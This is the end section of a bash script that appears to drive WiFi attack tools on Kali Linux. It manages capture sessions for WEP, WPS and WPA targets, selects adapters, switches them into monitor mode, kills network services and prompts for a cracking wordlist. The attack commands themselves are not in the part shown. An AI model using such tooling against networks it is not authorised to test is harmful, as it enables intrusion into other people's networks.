sessionRemoveEmpty(){

	currentTask="sessionRemoveEmpty"

	#banner
	#echo ""
	#echo "Removing Empty Sessions...."
	#echo ""
	#echo ""

	rm "$capturePath/$encryptionType/empty.sessions"
	rmdir "$capturePath/empty"

	banner
	echo ""
	#echo "Removing Empty Sessions...."
	#echo ""
	#echo ""

}


sessionCreatePaths(){

	getBSSIDCharOnly

	mkdir "$capturePath"
	mkdir "$capturePath/$encryptionType/"

}


sessionCopyNewCaptureFiles(){

	cp *.cap "$capturePath/$encryptionType"
	cp *.ivs "$capturePath/$encryptionType"
	cp *.xor "$capturePath/$encryptionType"
	cp *.csv "$capturePath/$encryptionType"
	cp *.netxml "$capturePath/$encryptionType"

}


sessionSave(){

	currentTask="sessionSave"

	getCurrentDateAndTime

	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "***** Save Current Session - $displayDateAndTime *****" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "Encryption: $encryptionTypeText" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "ESSID: $essid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "BSSID: $bssid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "Channel: $channel" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"

}


sessionLoad(){

	banner
	bannerStats

	currentTask="sessionLoad"

	while read line           
	do           
		echo -e "$line \n"           
	done <"$capturePath/$encryptionType/$encryptionType.sessions"

	echo ""
	echo ""
	echo ""
	echo "Scroll up to see all loaded sessions."
	echo ""
	echo ""
	echo ""
	echo "Press ENTER to continue...."
	echo ""
	echo ""

	read pause

}


cleanCaptureFiles(){

	currentTask="cleanCaptureFiles"

	banner
	echo ""
	$red
	echo "*** THIS WILL ERASE ALL CURRENT CAPTURE FILES!!!"
	$white
	echo ""
	echo ""
	echo "If you would like to create a backup before doing this, press B and ENTER"
	echo ""
	echo ""
	echo "If you would like to CANCEL, press C and ENTER"
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Files will be copied to the \"/sessions/\" directory and backed up to a ZIP file"
	echo ""
	echo ""
	echo ""
	echo ""
	$cyan
	echo "Automatically Continuing In 10 Seconds..."
	$white
	echo ""
	echo ""

	read -t 10 eraseCaptureConfirm

	case "$eraseCaptureConfirm" in

		"")
		banner
		echo ""
		echo "Cleaning Capture Files...."
		echo ""
		echo ""

		sleep 3

		rm *.cap
		rm *.ivs
		rm *.xor
		rm *.csv
		rm *.netxml
		;;

		"c" | "C")
		menuExtras
		;;

		"b" | "B")
		backupFromCaptureErase="1"
		backupSessionFiles
		;;

		*)
		cleanCaptureFiles
		;;

	esac

}


findCaptureFiles(){

	currentTask="findCaptureFiles"

	listCap=$(ls | grep .cap)
	listIvs=$(ls | grep .ivs)
	listXor=$(ls | grep .xor)
	listCsv=$(ls | grep .csv)
	listNetXml=$(ls | grep .netxml)

}


############################################################################
#   SESSIONS STUFF END   ###################################################
############################################################################





############################################################################
#   EMPTY VARIABLE CHECKS BEGIN   ##########################################
############################################################################


checkForEmptyEncryptionType(){

	currentTask="checkForEmptyEncryptionType"

	if [ "$encryptionType" == "empty" ];then

		banner
		bannerStats

		echo ""
		echo "There is currently no Encryption Type selected!"
		echo ""
		echo ""
		echo "Press ENTER to return to main menu...."
		echo ""
		echo ""

		read pause

		menuMain
	fi

}


checkForEmptyCredentials(){

	currentTask="checkForEmptyCredentials"

	case "$1" in

		"bssid")
		if [ "$bssid" == "" ];then

			banner
			bannerStats

			echo ""
			echo "There is currently no BSSID saved in the previous session!"
			echo ""
			echo ""
			echo "Press ENTER to return to previous menu...."
			echo ""
			echo ""

			read pause

			$lastMenuID
		fi
		;;

		"essid")
		if [ "$essid" == "" ];then

			banner
			bannerStats

			echo ""
			echo "There is currently no ESSID saved in the previous session!"
			echo ""
			echo ""
			echo "Press ENTER to return to previous menu...."
			echo ""
			echo ""

			read pause

		fi

		;;

		"channel")
		if [ "$channel" == "" ];then

			banner
			bannerStats

			echo ""
			echo "There is currently no CHANNEL saved in the previous session!"
			echo ""
			echo ""
			echo "Press ENTER to return to previous menu...."
			echo ""
			echo ""

			read pause

			$lastMenuID
		fi
		;;

	esac

}


############################################################################
#   EMPTY VARIABLE CHECKS END   ############################################
############################################################################





############################################################################
#   INTERFACE STUFF BEGIN   ################################################
############################################################################

checkInterfaceMode(){

	currentTask="checkInterfaceMode"

	interfaceModeCheck=$(iwconfig | grep "$interfaceMonitor" | head -c 5)

	case "$interfaceModeCheck" in

		"")
		interfaceMode="0"
		#break;
		;;

		*)
		interfaceMode="2"
		#break;
		;;

	esac
		
}


checkMultipleAdapters(){

	currentTask="checkMultipleAdapters"

	interfaceNumber="0"
	interfaceNumberMax="99"
	interfacesFound="0"

	while [ $interfaceNumber -le $interfaceNumberMax ]

	do
		banner
		$white
		echo ""
		echo "Checking WiFi Adapters...."
		echo ""
		echo ""

		interfaceCheck=$(iwconfig | grep "wlan$interfaceNumber" | head -c 5)
		interfaceMonitor="$interfaceCheck""mon"
		interfaceName=$interfaceMonitor

		case "$interfaceCheck" in

			"")
			interfaceNumber="99"
			interfaceNumberMax="99"
			break;
			;;

			*)
			#interface="$interfaceCheck"
			interfaceNumber=$(($interfaceNumber+1))
			interfacesFound=$(($interfacesFound+1))
			;;

		esac

		#echo "interfaceNumber: $interfaceNumber"
		#echo "interfaceNumberMax: $interfaceNumberMax"
		#echo "interfaceCheck: $interfaceCheck"
		#echo "interfacesFound: $interfacesFound"
		#read pause

		
	done

}


getWirelessInterfaceNames(){

	currentTask="getWirelessInterfaceNames"

	#if [ ! -z "$showAdapterUsbAtherosAR9271" ]; then
	
	#	showAdapterOneName="$showAdapterUsbAtherosAR9271"

	#fi 

}


getWirelessInterfaces(){

	currentTask="getWirelessInterfaces"

	# Check for the "refresh" flag and DO NOT display text if enabled
	# This is for the 2nd "getWirelessInterfaces" call for some forgotten reason :rolleyes: (Hides Text)
	case "$1" in

		# This is just splashing some text to wait out the 5 minute timeout....make it look useful!!
		"refresh")
		banner
		echo ""
		echo "Preparing $encryptionTypeText Attack...."
		echo ""
		;;

		*)
		checkMultipleAdapters

		banner
		echo ""
		$cyan
		echo "To Change Adapter Settings, Press \"C\" Now"
		$white
		#echo ""
		#$cyan
		#echo "Current: $interface"
		$white
		echo ""
		echo ""
		echo "To Select Interface From Discovered, Choose From Below"
		echo ""
		$green

		# If no adpaters found
		if [ $interfacesFound -eq "0" ]; then
			$red
			echo "NO WIFI ADAPTER FOUND!!!"
			$cyan
		fi

		# If only one device detected
		if [ $interfacesFound -eq "1" ]; then
			getWirelessInterfaceNames
			echo "1) wlan0 ($showAdapterOneName)"
		fi

		if [ $interfacesFound -eq "2" ]; then
			getWirelessInterfaceNames
			echo "1) wlan0 ($showAdapterOneName)"
			echo "2) wlan1 ($showAdapterTwoName)"
		fi

		if [ $interfacesFound -eq "3" ]; then
			getWirelessInterfaceNames
			echo "1) wlan0 ($showAdapterOneName)"
			echo "2) wlan1 ($showAdapterTwoName)"
			echo "3) wlan2 ($showAdapterThreeName)"
		fi

		if [ $interfacesFound -eq "4" ]; then
			getWirelessInterfaceNames
			echo "1) wlan0 ($showAdapterOneName)"
			echo "2) wlan1 ($showAdapterTwoName)"
			echo "3) wlan2 ($showAdapterThreeName)"
			echo "4) wlan3 ($showAdapterFourName)"
		fi

		if [ $interfacesFound -eq "5" ]; then
			getWirelessInterfaceNames
			echo "1) wlan0 ($showAdapterOneName)"
			echo "2) wlan1 ($showAdapterTwoName)"
			echo "3) wlan2 ($showAdapterThreeName)"
			echo "4) wlan3 ($showAdapterFourName)"
			echo "5) wlan4 ($showAdapterFiveName)"
		fi

		if [ $interfacesFound -eq "6" ]; then
			getWirelessInterfaceNames
			echo "1) wlan0 ($showAdapterOneName)"
			echo "2) wlan1 ($showAdapterTwoName)"
			echo "3) wlan2 ($showAdapterThreeName)"
			echo "4) wlan3 ($showAdapterFourName)"
			echo "5) wlan4 ($showAdapterFiveName)"
			echo "6) wlan5 ($showAdapterSixName)"
		fi

		if [ $interfacesFound -eq "7" ]; then
			getWirelessInterfaceNames
			echo "1) wlan0 ($showAdapterOneName)"
			echo "2) wlan1 ($showAdapterTwoName)"
			echo "3) wlan2 ($showAdapterThreeName)"
			echo "4) wlan3 ($showAdapterFourName)"
			echo "5) wlan4 ($showAdapterFiveName)"
			echo "6) wlan5 ($showAdapterSixName)"
			echo "7) wlan6 ($showAdapterSevenName)"
		fi

		if [ $interfacesFound -eq "8" ]; then
			getWirelessInterfaceNames
			echo "1) wlan0 ($showAdapterOneName)"
			echo "2) wlan1 ($showAdapterTwoName)"
			echo "3) wlan2 ($showAdapterThreeName)"
			echo "4) wlan3 ($showAdapterFourName)"
			echo "5) wlan4 ($showAdapterFiveName)"
			echo "6) wlan5 ($showAdapterSixName)"
			echo "7) wlan6 ($showAdapterSevenName)"
			echo "8) wlan7 ($showAdapterEightName)"
		fi

		if [ $interfacesFound -eq "9" ]; then
			getWirelessInterfaceNames
			echo "1) wlan0 ($showAdapterOneName)"
			echo "2) wlan1 ($showAdapterTwoName)"
			echo "3) wlan2 ($showAdapterThreeName)"
			echo "4) wlan3 ($showAdapterFourName)"
			echo "5) wlan4 ($showAdapterFiveName)"
			echo "6) wlan5 ($showAdapterSixName)"
			echo "7) wlan6 ($showAdapterSevenName)"
			echo "8) wlan7 ($showAdapterEightName)"
			echo "9) wlan8 ($showAdapterNineName)"
		fi

		if [ $interfacesFound -eq "10" ]; then
			getWirelessInterfaceNames
			echo "1) wlan0 ($showAdapterOneName)"
			echo "2) wlan1 ($showAdapterTwoName)"
			echo "3) wlan2 ($showAdapterThreeName)"
			echo "4) wlan3 ($showAdapterFourName)"
			echo "5) wlan4 ($showAdapterFiveName)"
			echo "6) wlan5 ($showAdapterSixName)"
			echo "7) wlan6 ($showAdapterSevenName)"
			echo "8) wlan7 ($showAdapterEightName)"
			echo "9) wlan8 ($showAdapterNineName)"
			echo "10) wlan9 ($showAdapterTenName)"
		fi

		$white
		echo ""
		echo ""
		echo ""
		echo "TO USE DEFAULTS, JUST PRESS ENTER!"
		echo ""
		echo ""
		echo "Continuing In 10 Seconds...."
		echo ""
		echo ""
		;;

	esac

	read -t 10 manualInterface

	hotkeyInput="$manualInterface"

	loadMenuHotkeys "$hotkeyInput"

	case "$manualInterface" in

		"")
		case "$isKaliTwo" in

			"0")
			interface=$(iwconfig | grep "wlan" | head -c 5)
			#interfaceMonitor=$(iwconfig | grep "mon" | head -c 4)
			interfaceMonitor="$interface""mon"
			interfaceName=$interfaceMonitor
			;;

			"1")
			interface=$(iwconfig | grep "wlan" | head -c 5)
			#interfaceMonitor=$(iwconfig | grep "wlan" | head -c 8)
			interfaceMonitor="$interface""mon"
			interfaceName=$interfaceMonitor
			#fixKaliTwoMonError
			;;

		esac
		;;

		"1")
		interface="wlan0"
		interfaceMonitor="$interface""mon"
		interfaceName="$interfaceMonitor"
		;;

		"2")
		interface="wlan1"
		interfaceMonitor="$interface""mon"
		interfaceName="$interfaceMonitor"
		;;

		"3")
		interface="wlan2"
		interfaceMonitor="$interface""mon"
		interfaceName="$interfaceMonitor"
		;;

		"4")
		interface="wlan3"
		interfaceMonitor="$interface""mon"
		interfaceName="$interfaceMonitor"
		;;

		"5")
		interface="wlan4"
		interfaceMonitor="$interface""mon"
		interfaceName="$interfaceMonitor"
		;;

		"6")
		interface="wlan5"
		interfaceMonitor="$interface""mon"
		interfaceName="$interfaceMonitor"
		;;

		"7")
		interface="wlan6"
		interfaceMonitor="$interface""mon"
		interfaceName="$interfaceMonitor"
		;;

		"8")
		interface="wlan7"
		interfaceMonitor="$interface""mon"
		interfaceName="$interfaceMonitor"
		;;

		"9")
		interface="wlan8"
		interfaceMonitor="$interface""mon"
		interfaceName="$interfaceMonitor"
		;;

		"10")
		interface="wlan9"
		interfaceMonitor="$interface""mon"
		interfaceName="$interfaceMonitor"
		;;

		"C" | "c")
		banner
		echo ""
		echo "Enter Managed Mode Interface Name and press ENTER:"
		echo ""
		echo ""
		echo ""
		echo "Example: wlan0"
		echo ""
		echo ""
		echo ""
		$cyan
		echo "If Nothing Is Entered, Then Default Values Are Used"
		$white
		echo ""
		echo ""

		read manualSelectionManaged

		case "$manualSelectionManaged" in

			"")
			interface=$(iwconfig | grep "wlan" | head -c 5)
			manualSelectionManaged="$interface"
			;;

			*)
			interface="$manualSelectionManaged"
			interfaceName="$interface$manualSelectionManaged"
			;;

		esac

		banner
		echo ""
		echo "Enter Monitor Mode Interface Name and press ENTER:"
		echo ""
		echo ""
		echo ""
		echo "Example: $manualSelectionManaged""mon"
		echo ""
		echo ""
		echo ""
		$cyan
		echo "If Nothing Is Entered, Then Default Values Are Used"
		$white
		echo ""
		echo ""

		read manualSelectionMonitor

		case "$manualSelectionMonitor" in

			"")
			interfaceMonitor="$interface""mon"
			;;

			*)
			interfaceMonitor="$manualSelectionMonitor""mon"
			interfaceName="$manualSelectionMonitor""mon"
			;;

		esac
		;;

		"W" | "w")
		#returnTo="getWirelessInterfaces"
		#spoofMacAddress
		getWirelessInterfaces
		;;

		*)
		getWirelessInterfaces
		;;

	esac

	#echo "$interface"
	#echo "$interfaceMonitor"
	#read pause

}


disableChannelHopping(){

	sleep 1
	ifconfig $interface down

}


enableChannelHopping(){

	sleep 1
	ifconfig $interface up

}

interfaceUp(){

	#ifconfig $interface up
	ifconfig $interfaceMonitor up

}


interfaceDown(){

	#ifconfig $interface down
	ifconfig $interfaceMonitor down

}


interfaceManaged(){

	#iwconfig wlan0mon mode managed
	iwconfig $interfaceMonitor mode managed

}


interfaceMonitor(){

	#iwconfig wlan0mon mode monitor
	iwconfig $interfaceMonitor mode monitor

}


fixKaliTwoMonError(){

	currentTask="fixKaliTwoMonError"

	case "$isDebugMode" in
	
		"1")
		echo "DEBUG: Kali 2.x Fix - Step 1"
		echo ""
		echo "$interface"
		echo "$interfaceMonitor"
		read pause
		;;
	esac

	ifconfig $interfaceMonitor down
	sleep 2
	iwconfig $interfaceMonitor mode monitor
	sleep 2
	ifconfig $interfaceMonitor up

	case "$isDebugMode" in
	
		"1")
		echo "DEBUG: Kali 2.x Fix - Step 2"
		echo ""
		echo "$interface"
		echo "$interfaceMonitor"
		read pause
		;;
	esac
}


############################################################################
#   INTERFACE STUFF END   ##################################################
############################################################################



############################################################################
#   MISC STUFF BEGIN   #####################################################
############################################################################


# Reset Session Values Back To Default
setDefaultSession(){

	currentTask="setDefaultSession"

	sessionID="0"

	capturePath=$(echo "$PWD/sessions")
	capturePathWEP=$(echo "$PWD/sessions/wep")
	capturePathWPS=$(echo "$PWD/sessions/wps")
	capturePathWPA=$(echo "$PWD/sessions/wpa")
	capturePathWPA2=$(echo "$PWD/sessions/wpa2")

}


getCustomList(){

	banner
	bannerStats

	currentTask="getCustomList"

	echo ""
	echo "Enter the path to the list and press ENTER:"
	echo ""
	echo ""
	echo "Example: /pentest/wordlists/dictionary1.txt"
	echo ""
	echo ""


	read tmpCustomList

	case "$tmpCustomList" in

		"")
		getCustomList
		;;

		*)
		wordlist="$tmpCustomList"
		;;

	esac

}


getBSSIDCharOnly(){

	currentTask="getBSSIDCharOnly"

	if [ "$bssid" != "" ];then

		bssidCharOnly=$(echo $bssid | sed 's/[\:]//g')
	fi

}


getCurrentDate(){

	displayDate=$(date +"%D")
	displayDate2=$(date +"%Y-%m-%d")
	displayDate3=$(date +"%Y%m%d")

}


getCurrentTime(){

	displayTime=$(date +"%T")

}


getCurrentDateAndTime(){

	displayDateAndTime=$(date +"%D - %T")
	displayDateAndTime2=$(date +"%Y%m%d / %T")
	displayDateAndTime3=$(date +"%Y-%m-%d / %T")

}


fixNegativeOneChannelError(){

	airmon-ng check kill

}


startNetworkManager(){

	NetworkManager

}


killNetworkManager(){

	currentPID=$(ps -A | grep NetworkManager | cut -c 1-5)
	killTask=$(kill $currentPID)

	#echo "$currentPID"
	#echo "$killTask"

	#read pause

}


wpaSupplicantKill(){

	currentTask="wpaSupplicantKill"

	#currentPID=$(ps -A | grep wpa_supplicant | cut -c 1-5)
	#killTask=$(kill $currentPID)

	killall wpa_supplicant

	#echo "$currentPID"
	#echo "$killTask"

	#read pause

}

wpaSupplicantEnable(){

	currentTask="wpaSupplicantEnable"

	systemctl enable wpa_supplicant

}

wpaSupplicantDisable(){

	currentTask="wpaSupplicantDisable"

	systemctl disable wpa_supplicant

}


# This will output all variables and values currently in use, and is for debugging purposes only
dumpEnvironment(){

	currentTask="dumpEnvironment"

	

}


readXML(){

	local ifsType="$1"
	local ifsCustom="$2"

	currentTask="readXML"

	case "$ifsType" in

		"")
		local IFS=\> ; read -d \< E C ;
		;;

		"essid")
		local IFS=\> ; read -d \< E C ;
		;;

		"bssid")
		local IFS=\> ; read -d \< E C ;
		;;

		"channel")
		local IFS=\> ; read -d \< E C ;
		;;

		# Takes 2 parameters
		"custom")
		local IFS=$ifsCustom ; read -d $ifsCustom E C ;
		;;

	esac

	

}




openScanTargetsAsText(){

	while readXML "essid" ""; do

    	if [[ $E = " cloaked=\"false\"" ]]; then
        	echo $C
    	fi

	done < "$defaultScanOutputXML" >> "$defaultScanOutputTXT"

	while readXML "bssid" ""; do

    	if [[ $E = BSSID ]]; then
        	echo $C
    	fi

	done < "$defaultScanOutputXML" >> "$defaultScanOutputTXT"

	while readXML "channel" ""; do

    	if [[ $E = channel ]]; then
        	echo $C
    	fi

	done < "$defaultScanOutputXML" >> "$defaultScanOutputTXT"

	$terminal gedit "$defaultScanOutputTXT"
}


cleanTempScanResultsFile(){

	flag="$1"

	case "$flag" in

		"all")
		rm "$defaultScanOutputIVS"
		rm "$defaultScanOutputXML"
		rm "$defaultScanOutputTXT"
		;;

		"ivs")
		rm "$defaultScanOutputIVS"
		;;

		"xml")
		rm "$defaultScanOutputXML"
		;;

		"txt")
		rm "$defaultScanOutputTXT"
		;;

	esac

}


############################################################################
#   MISC STUFF END   #######################################################
############################################################################





############################################################################
#   INITIAL LAUNCH BEGIN   #################################################
############################################################################


initMain


############################################################################
#   INITIAL LAUNCH END   ###################################################
############################################################################





